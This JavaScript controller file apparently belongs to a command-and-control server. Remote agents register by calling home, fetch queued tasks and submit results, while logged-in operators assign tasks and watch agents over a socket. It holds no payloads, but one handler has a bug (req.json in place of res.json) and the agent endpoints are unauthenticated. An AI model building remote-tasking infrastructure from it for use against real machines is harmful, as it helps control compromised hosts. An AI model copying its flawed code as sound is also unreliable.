/**
 * @file Controller code for the agent-related ops.
 * @author Umar Abdul
 */

import Agent, * as agentModel from '../models/agent.js';
import Task, * as taskModel from '../models/task.js';

/**
 * Create a new agent. Called when a new agent calls home.
 */
export const agentInit = (req, res) => {
  
  agentModel.createAgent(req.body).then(data => {
    socketServer.emit("new_agent", data.agent);
    return res.json(data.config);
  }).catch(error => {
    return res.status(500).json({error: error.message});
  });
};

/**
 * Get all agents. For authenticated users only.
 */
export const getAgents = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json({error: "Permission denied!"});
  agentModel.getAgents().then(agents => {
    return res.json(agents);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Get an agent with given ID.
 */
export const getAgent = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json({error: "Permission denied!"});
  agentModel.getAgent(req.params.uid).then(agent => {
    return req.json(agent);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Create a new task. For users only.
 */
export const createTask = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json({error: "Permission denied!"});
  taskModel.createTask(req.session.username, req.body).then(task => {
    socketServer.emit("new_task", task);
    return res.json(task);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Get all tasks for all agents. For authenticated users only.
 */
export const getAllTasks = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json({error: "Permission denied!"});
  taskModel.getAllTasks().then(tasks => {
    return res.json(tasks);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Used by agents to receive all their queued tasks.
 * Note: It will also mark all the tasks sent as 'received'.
 */
export const getPendingTasks = (req, res) => {

  const agentID = req.params.uid;
  agentModel.updateLastSeen(agentID);
  createUpdateAgentEvent(agentID);
  taskModel.getPendingTasks(agentID).then(async (tasks) => {
    // Mark them as received.
    for (let task of tasks){
      try{
        await taskModel.markReceived(task.uid);
        createUpdateTaskEvent(task.uid);
      }catch(err){
        console.log(err);
      }
    }

    return res.json(tasks);
  });
};

/**
 * Get all the tasks created for a specific agent. For authenticated users only.
 */
export const getTasks = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json({error: "Permission denied!"});
  const agentID = req.params.uid;
  taskModel.getTasks(agentID).then(tasks => {
    return res.json(tasks);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Used by agents to submit the results of their tasks.
 */
export const setTasksResults = async (req, res) => {

  const agentID = req.params.uid;
  const results = req.body;
  if (!(results && results.length !== 0))
    return res.status(403).json({error: "No results defined!"});
  for (let result of results){
    try{
      await taskModel.setResult(result.uid, result.result);
      createUpdateTaskEvent(result.uid);
    }catch(error){
      console.log(error);
    }
  }
  return res.json({});
};

/**
 * Broadcast an updated agent to users.
 * @param agentID - The ID of the agent. If this is an object, it will be treated as an already-loaded agent.
 */
export const createUpdateAgentEvent = async (agentID) => {

  let agent = agentID;
  if (typeof(agent) !== "object")
    agent = await Agent.findOne({uid: agentID.toString()});
  if (agent)
    socketServer.emit("update_agent", agent);
};

/**
 * Broadcast an updated task to users.
 * @param taskID - The ID of the task. If this is an object, it will be treated as an already-loaded task.
 */
export const createUpdateTaskEvent = async (taskID) => {

  let task = taskID;
  if (typeof(task) !== "object")
    task = await Task.findOne({uid: taskID.toString()});
  if (task)
    socketServer.emit("update_task", task);
};
